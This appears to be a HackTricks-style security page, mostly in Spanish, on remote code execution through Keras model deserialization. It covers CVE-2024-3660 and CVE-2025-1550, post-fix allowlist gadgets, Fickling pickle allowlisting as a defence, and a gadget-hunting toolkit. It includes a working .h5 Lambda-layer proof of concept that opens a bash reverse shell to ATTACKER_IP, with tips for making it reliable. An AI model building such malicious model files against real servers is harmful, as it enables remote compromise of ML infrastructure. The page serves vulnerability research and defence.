# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Esta página resume técnicas prácticas de explotación contra el pipeline de deserialización de modelos de Keras, explica los detalles internos del formato nativo .keras y su attack surface, y proporciona un kit de herramientas para investigadores para encontrar Model File Vulnerabilities (MFVs) y post-fix gadgets.

## Detalles internos del formato .keras

A .keras file is a ZIP archive containing at least:
- metadata.json – información genérica (p. ej., versión de Keras)
- config.json – arquitectura del modelo (primary attack surface)
- model.weights.h5 – pesos en HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La deserialización realiza:
- Importación de módulos y resolución de símbolos desde claves module/class_name
- Invocación de from_config(...) o del constructor con kwargs controlados por el atacante
- Recursión en objetos anidados (activations, initializers, constraints, etc.)

Históricamente, esto exponía tres primitivas a un atacante que elaborara config.json:
- Control sobre qué módulos se importan
- Control sobre qué clases/funciones se resuelven
- Control de los kwargs pasados a constructores/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Causa raíz:
- Lambda.from_config() usaba python_utils.func_load(...) que decodifica en base64 y llama a marshal.loads() sobre bytes controlados por el atacante; la deserialización (unmarshalling) de Python puede ejecutar código.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigación:
- Keras aplica safe_mode=True por defecto. Las funciones Python serializadas en Lambda están bloqueadas a menos que un usuario opte explícitamente por desactivar con safe_mode=False.

Notas:
- Los formatos legacy (guardados HDF5 más antiguos) o bases de código antiguas pueden no aplicar verificaciones modernas, por lo que los ataques de estilo “downgrade” todavía pueden ser aplicables cuando víctimas usan loaders más antiguos.

## CVE-2025-1550 – Importación arbitraria de módulos en Keras ≤ 3.8

Causa raíz:
- _retrieve_class_or_fn usaba importlib.import_module() sin restricciones con attacker-controlled module strings provenientes de config.json.
- Impacto: Importación arbitraria de cualquier módulo instalado (o attacker-planted module en sys.path). El código en import-time se ejecuta, y luego la construcción del objeto ocurre con attacker kwargs.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Mejoras de seguridad (Keras ≥ 3.9):
- Lista blanca de módulos: los imports se restringen a módulos oficiales del ecosistema: keras, keras_hub, keras_cv, keras_nlp
- Modo seguro por defecto: safe_mode=True bloquea la carga de funciones serializadas Lambda inseguras
- Comprobación básica de tipos: los objetos deserializados deben coincidir con los tipos esperados

## Explotación práctica: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Muchos stacks de producción aún aceptan archivos de modelo HDF5 (.h5) legacy de TensorFlow-Keras. Si un atacante puede subir un modelo que el servidor luego carga o usa para inferencia, una capa Lambda puede ejecutar código Python arbitrario al cargar/construir/predecir.

PoC mínimo para crear un .h5 malicioso que ejecute un reverse shell cuando se deserialice o se utilice:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas y consejos de fiabilidad:
- Puntos de activación: el código puede ejecutarse varias veces (p. ej., durante layer build/first call, model.load_model, y predict/fit). Asegúrate de que los payloads sean idempotentes.
- Fijación de versiones: empareja el TF/Keras/Python de la víctima para evitar incompatibilidades de serialización. Por ejemplo, construye artefactos bajo Python 3.8 con TensorFlow 2.13.1 si eso es lo que usa el objetivo.
- Replicación rápida del entorno:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validación: una carga útil benigna como os.system("ping -c 1 YOUR_IP") ayuda a confirmar la ejecución (por ejemplo, observar ICMP con tcpdump) antes de cambiar a un reverse shell.

## Superficie post-fix gadget dentro de la allowlist

Incluso con allowlisting y safe mode, sigue existiendo una amplia superficie entre los callables permitidos de Keras. Por ejemplo, keras.utils.get_file puede descargar URLs arbitrarias a ubicaciones que el usuario pueda seleccionar.

Gadget via Lambda que referencia una función permitida (no bytecode de Python serializado):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitación importante:
- Lambda.call() antepone el tensor de entrada como el primer argumento posicional al invocar el callable objetivo. Los gadgets elegidos deben tolerar un argumento posicional extra (o aceptar *args/**kwargs). Esto restringe qué funciones son viables.

## Lista blanca de importaciones de pickle de ML para modelos AI/ML (Fickling)

Muchos formatos de modelos AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artifacts antiguos de TensorFlow, etc.) incrustan datos de pickle de Python. Los atacantes abusan rutinariamente de imports GLOBAL de pickle y de constructores de objetos para lograr RCE o intercambiar modelos durante la carga. Los escáneres basados en listas negras a menudo no detectan imports peligrosos nuevos o no listados.

Una defensa práctica fail-closed es enganchar el deserializador de pickle de Python y permitir solo un conjunto revisado de importaciones relacionadas con ML inocuas durante el unpickling. Trail of Bits’ Fickling implementa esta política y proporciona una lista blanca curada de imports ML construida a partir de miles de pickles públicos de Hugging Face.

Modelo de seguridad para importaciones “seguras” (intuiciones destiladas de investigación y práctica): los símbolos importados usados por un pickle deben simultáneamente:
- No ejecutar código ni provocar ejecución (no compiled/source code objects, shelling out, hooks, etc.)
- No obtener/establecer atributos o elementos arbitrarios
- No importar u obtener referencias a otros objetos Python desde la pickle VM
- No activar deserializadores secundarios (p. ej., marshal, nested pickle), ni siquiera indirectamente

Habilita las protecciones de Fickling lo antes posible en el arranque del proceso para que cualquier carga de pickle realizada por frameworks (torch.load, joblib.load, etc.) sea comprobada:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Consejos operativos:
- Puedes desactivar temporalmente/reactivar los hooks donde sea necesario:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modelo conocido y fiable está bloqueado, extienda la allowlist para su entorno después de revisar los símbolos:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling también expone protecciones genéricas en tiempo de ejecución si prefieres un control más granular:
- fickling.always_check_safety() para hacer cumplir las comprobaciones en todos los pickle.load()
- with fickling.check_safety(): para aplicarlo de forma delimitada
- fickling.load(path) / fickling.is_likely_safe(path) para comprobaciones puntuales

- Prefiere formatos de modelo no-pickle cuando sea posible (por ejemplo, SafeTensors). Si debes aceptar pickle, ejecuta los loaders con los mínimos privilegios sin egress de red y aplica la allowlist.

Esta estrategia allowlist-first bloquea de forma demostrable las rutas de exploit comunes de ML con pickle manteniendo alta compatibilidad. En el benchmark de ToB, Fickling detectó el 100% de los archivos maliciosos sintéticos y permitió ~99% de los archivos limpios de los repos top de Hugging Face.


## Kit de herramientas para investigadores

1) Descubrimiento sistemático de gadgets en módulos permitidos

Enumera callables candidatos en keras, keras_nlp, keras_cv, keras_hub y prioriza aquellos con efectos secundarios sobre file/network/process/env.

<details>
<summary>Enumerar callables potencialmente peligrosos en módulos Keras incluidos en la allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Pruebas de deserialización directa (no se necesita archivo .keras)

Introduce dicts creados directamente en los deserializadores de Keras para aprender los parámetros aceptados y observar efectos secundarios.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Exploración entre versiones y formatos

Keras existe en múltiples codebases/eras con diferentes mecanismos de protección y formatos:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Repite las pruebas a través de las distintas codebases y formatos (.keras vs legacy HDF5) para descubrir regresiones o protecciones faltantes.

## Referencias

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
